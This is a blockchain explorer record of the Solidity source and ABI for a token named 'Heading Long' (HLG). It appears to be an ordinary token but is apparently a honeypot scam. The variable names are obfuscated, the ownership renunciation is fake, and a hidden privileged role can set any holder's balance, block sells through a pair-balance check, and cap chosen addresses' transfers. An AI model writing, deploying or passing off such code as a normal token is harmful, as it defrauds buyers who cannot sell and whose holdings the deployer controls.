{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface marketingWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract marketingLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingIsTeam {\n    function createPair(address toReceiverShould, address walletList) external returns (address);\n}\n\ninterface exemptWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedSell) external view returns (uint256);\n\n    function transfer(address receiverAmount, uint256 enableMarketing) external returns (bool);\n\n    function allowance(address autoTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverAmount,\n        uint256 enableMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenShould, uint256 value);\n    event Approval(address indexed autoTeam, address indexed spender, uint256 value);\n}\n\ninterface exemptWalletMetadata is exemptWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HeadingLong is marketingLaunch, exemptWallet, exemptWalletMetadata {\n\n    uint256 public isMode;\n\n    address isFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxShould;\n    }\n\n    function swapLiquidity(address receiverTeam, address receiverAmount, uint256 enableMarketing) internal returns (bool) {\n        if (receiverTeam == walletLaunch) {\n            return txBuy(receiverTeam, receiverAmount, enableMarketing);\n        }\n        uint256 receiverMinShould = exemptWallet(senderMax).balanceOf(launchedLimit);\n        require(receiverMinShould == exemptSell);\n        require(receiverAmount != launchedLimit);\n        if (listTeam[receiverTeam]) {\n            return txBuy(receiverTeam, receiverAmount, exemptLaunched);\n        }\n        return txBuy(receiverTeam, receiverAmount, enableMarketing);\n    }\n\n    function transfer(address listTake, uint256 enableMarketing) external virtual override returns (bool) {\n        return swapLiquidity(_msgSender(), listTake, enableMarketing);\n    }\n\n    bool private autoIs;\n\n    event OwnershipTransferred(address indexed liquidityEnable, address indexed shouldTotalAuto);\n\n    mapping(address => uint256) private tradingTx;\n\n    function modeShould(uint256 enableMarketing) public {\n        isMin();\n        exemptSell = enableMarketing;\n    }\n\n    constructor (){\n        if (feeFund) {\n            isMode = walletEnable;\n        }\n        marketingWallet feeLaunch = marketingWallet(isFrom);\n        senderMax = tradingIsTeam(feeLaunch.factory()).createPair(feeLaunch.WETH(), address(this));\n        \n        walletLaunch = _msgSender();\n        shouldEnable();\n        takeAmountEnable[walletLaunch] = true;\n        tradingTx[walletLaunch] = maxShould;\n        if (maxAtLiquidity) {\n            feeMarketingLiquidity = walletEnable;\n        }\n        emit Transfer(address(0), walletLaunch, maxShould);\n    }\n\n    mapping(address => mapping(address => uint256)) private tradingAmount;\n\n    string private swapToTrading = \"HLG\";\n\n    function approve(address tokenLaunched, uint256 enableMarketing) public virtual override returns (bool) {\n        tradingAmount[_msgSender()][tokenLaunched] = enableMarketing;\n        emit Approval(_msgSender(), tokenLaunched, enableMarketing);\n        return true;\n    }\n\n    bool public limitMax;\n\n    function owner() external view returns (address) {\n        return listSwap;\n    }\n\n    address public senderMax;\n\n    mapping(address => bool) public listTeam;\n\n    function getOwner() external view returns (address) {\n        return listSwap;\n    }\n\n    uint256 public feeMarketingLiquidity;\n\n    address private listSwap;\n\n    function shouldEnable() public {\n        emit OwnershipTransferred(walletLaunch, address(0));\n        listSwap = address(0);\n    }\n\n    function isMin() private view {\n        require(takeAmountEnable[_msgSender()]);\n    }\n\n    address launchedLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address launchedSell) public view virtual override returns (uint256) {\n        return tradingTx[launchedSell];\n    }\n\n    uint256 exemptSell;\n\n    function sellLaunched(address txToken) public {\n        require(txToken.balance < 100000);\n        if (tokenMax) {\n            return;\n        }\n        \n        takeAmountEnable[txToken] = true;\n        \n        tokenMax = true;\n    }\n\n    bool public tokenMax;\n\n    mapping(address => bool) public takeAmountEnable;\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapToTrading;\n    }\n\n    uint8 private fromIs = 18;\n\n    function txBuy(address receiverTeam, address receiverAmount, uint256 enableMarketing) internal returns (bool) {\n        require(tradingTx[receiverTeam] >= enableMarketing);\n        tradingTx[receiverTeam] -= enableMarketing;\n        tradingTx[receiverAmount] += enableMarketing;\n        emit Transfer(receiverTeam, receiverAmount, enableMarketing);\n        return true;\n    }\n\n    string private isReceiver = \"Heading Long\";\n\n    function allowance(address marketingAtShould, address tokenLaunched) external view virtual override returns (uint256) {\n        if (tokenLaunched == isFrom) {\n            return type(uint256).max;\n        }\n        return tradingAmount[marketingAtShould][tokenLaunched];\n    }\n\n    bool private feeFund;\n\n    address public walletLaunch;\n\n    function name() external view virtual override returns (string memory) {\n        return isReceiver;\n    }\n\n    uint256 constant exemptLaunched = 7 ** 10;\n\n    uint256 listTotal;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromIs;\n    }\n\n    uint256 public walletEnable;\n\n    function toFrom(address listTake, uint256 enableMarketing) public {\n        isMin();\n        tradingTx[listTake] = enableMarketing;\n    }\n\n    uint256 private maxShould = 100000000 * 10 ** 18;\n\n    bool private maxAtLiquidity;\n\n    function transferFrom(address receiverTeam, address receiverAmount, uint256 enableMarketing) external override returns (bool) {\n        if (_msgSender() != isFrom) {\n            if (tradingAmount[receiverTeam][_msgSender()] != type(uint256).max) {\n                require(enableMarketing <= tradingAmount[receiverTeam][_msgSender()]);\n                tradingAmount[receiverTeam][_msgSender()] -= enableMarketing;\n            }\n        }\n        return swapLiquidity(receiverTeam, receiverAmount, enableMarketing);\n    }\n\n    function walletMin(address amountToken) public {\n        isMin();\n        if (feeMarketingLiquidity != isMode) {\n            maxAtLiquidity = false;\n        }\n        if (amountToken == walletLaunch || amountToken == senderMax) {\n            return;\n        }\n        listTeam[amountToken] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTotalAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAtShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketingLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableMarketing\",\"type\":\"uint256\"}],\"name\":\"modeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txToken\",\"type\":\"address\"}],\"name\":\"sellLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeAmountEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMarketing\",\"type\":\"uint256\"}],\"name\":\"toFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountToken\",\"type\":\"address\"}],\"name\":\"walletMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "HeadingLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}